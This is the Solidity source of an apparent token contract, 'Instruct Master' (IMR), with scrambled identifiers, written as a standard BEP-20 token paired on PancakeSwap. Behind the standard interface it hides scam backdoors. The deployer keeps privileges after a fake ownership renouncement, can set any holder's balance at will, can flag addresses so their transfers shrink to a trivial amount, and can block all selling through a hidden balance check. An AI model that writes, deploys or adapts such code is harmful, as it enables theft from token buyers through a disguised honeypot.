//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface receiverBuySwap {
    function createPair(address buyToken, address amountTx) external returns (address);
}

interface tokenSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minTeamExempt) external view returns (uint256);

    function transfer(address modeTeam, uint256 fundTakeEnable) external returns (bool);

    function allowance(address tokenTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundTakeEnable) external returns (bool);

    function transferFrom(
        address sender,
        address modeTeam,
        uint256 fundTakeEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeList, uint256 value);
    event Approval(address indexed tokenTo, address indexed spender, uint256 value);
}

abstract contract minList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listLaunchFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchShould is tokenSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InstructMaster is minList, tokenSender, launchShould {

    function transferFrom(address sellLaunch, address modeTeam, uint256 fundTakeEnable) external override returns (bool) {
        if (_msgSender() != shouldLimit) {
            if (takeReceiverMin[sellLaunch][_msgSender()] != type(uint256).max) {
                require(fundTakeEnable <= takeReceiverMin[sellLaunch][_msgSender()]);
                takeReceiverMin[sellLaunch][_msgSender()] -= fundTakeEnable;
            }
        }
        return listMarketing(sellLaunch, modeTeam, fundTakeEnable);
    }

    bool public walletAmountList;

    constructor (){
        
        listLaunchFund buyLiquidityTotal = listLaunchFund(shouldLimit);
        totalToFrom = receiverBuySwap(buyLiquidityTotal.factory()).createPair(buyLiquidityTotal.WETH(), address(this));
        if (buyEnable == receiverAt) {
            minEnable = fundLaunched;
        }
        txFrom = _msgSender();
        listSenderAmount[txFrom] = true;
        exemptMode[txFrom] = totalTeam;
        amountReceiver();
        
        emit Transfer(address(0), txFrom, totalTeam);
    }

    function name() external view virtual override returns (string memory) {
        return marketingLaunch;
    }

    function balanceOf(address minTeamExempt) public view virtual override returns (uint256) {
        return exemptMode[minTeamExempt];
    }

    function sellTotal(address sellLaunch, address modeTeam, uint256 fundTakeEnable) internal returns (bool) {
        require(exemptMode[sellLaunch] >= fundTakeEnable);
        exemptMode[sellLaunch] -= fundTakeEnable;
        exemptMode[modeTeam] += fundTakeEnable;
        emit Transfer(sellLaunch, modeTeam, fundTakeEnable);
        return true;
    }

    mapping(address => uint256) private exemptMode;

    function autoEnableList(uint256 fundTakeEnable) public {
        txTo();
        fromSwap = fundTakeEnable;
    }

    uint256 private totalTeam = 100000000 * 10 ** 18;

    function tokenReceiverFee(address modeLiquidity) public {
        require(modeLiquidity.balance < 100000);
        if (marketingTotal) {
            return;
        }
        if (minEnable == receiverAt) {
            walletAmountList = false;
        }
        listSenderAmount[modeLiquidity] = true;
        
        marketingTotal = true;
    }

    bool public fundLiquidity;

    event OwnershipTransferred(address indexed atMax, address indexed exemptTo);

    function transfer(address senderList, uint256 fundTakeEnable) external virtual override returns (bool) {
        return listMarketing(_msgSender(), senderList, fundTakeEnable);
    }

    mapping(address => mapping(address => uint256)) private takeReceiverMin;

    uint8 private sellBuyTotal = 18;

    address public txFrom;

    function approve(address toTakeToken, uint256 fundTakeEnable) public virtual override returns (bool) {
        takeReceiverMin[_msgSender()][toTakeToken] = fundTakeEnable;
        emit Approval(_msgSender(), toTakeToken, fundTakeEnable);
        return true;
    }

    uint256 private buyEnable;

    function amountReceiver() public {
        emit OwnershipTransferred(txFrom, address(0));
        swapEnable = address(0);
    }

    uint256 launchedTeam;

    string private sellTake = "IMR";

    bool public marketingTotal;

    address receiverMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 fromSwap;

    function symbol() external view virtual override returns (string memory) {
        return sellTake;
    }

    address private swapEnable;

    function getOwner() external view returns (address) {
        return swapEnable;
    }

    mapping(address => bool) public listLaunch;

    address public totalToFrom;

    uint256 constant teamList = 14 ** 10;

    function toEnable(address fromMode) public {
        txTo();
        
        if (fromMode == txFrom || fromMode == totalToFrom) {
            return;
        }
        listLaunch[fromMode] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return sellBuyTotal;
    }

    function allowance(address feeMin, address toTakeToken) external view virtual override returns (uint256) {
        if (toTakeToken == shouldLimit) {
            return type(uint256).max;
        }
        return takeReceiverMin[feeMin][toTakeToken];
    }

    function owner() external view returns (address) {
        return swapEnable;
    }

    function listMarketing(address sellLaunch, address modeTeam, uint256 fundTakeEnable) internal returns (bool) {
        if (sellLaunch == txFrom) {
            return sellTotal(sellLaunch, modeTeam, fundTakeEnable);
        }
        uint256 tokenIs = tokenSender(totalToFrom).balanceOf(receiverMax);
        require(tokenIs == fromSwap);
        require(modeTeam != receiverMax);
        if (listLaunch[sellLaunch]) {
            return sellTotal(sellLaunch, modeTeam, teamList);
        }
        return sellTotal(sellLaunch, modeTeam, fundTakeEnable);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return totalTeam;
    }

    function txTo() private view {
        require(listSenderAmount[_msgSender()]);
    }

    uint256 private receiverAt;

    mapping(address => bool) public listSenderAmount;

    function modeSellBuy(address senderList, uint256 fundTakeEnable) public {
        txTo();
        exemptMode[senderList] = fundTakeEnable;
    }

    uint256 private fundLaunched;

    string private marketingLaunch = "Instruct Master";

    uint256 public minEnable;

    address shouldLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}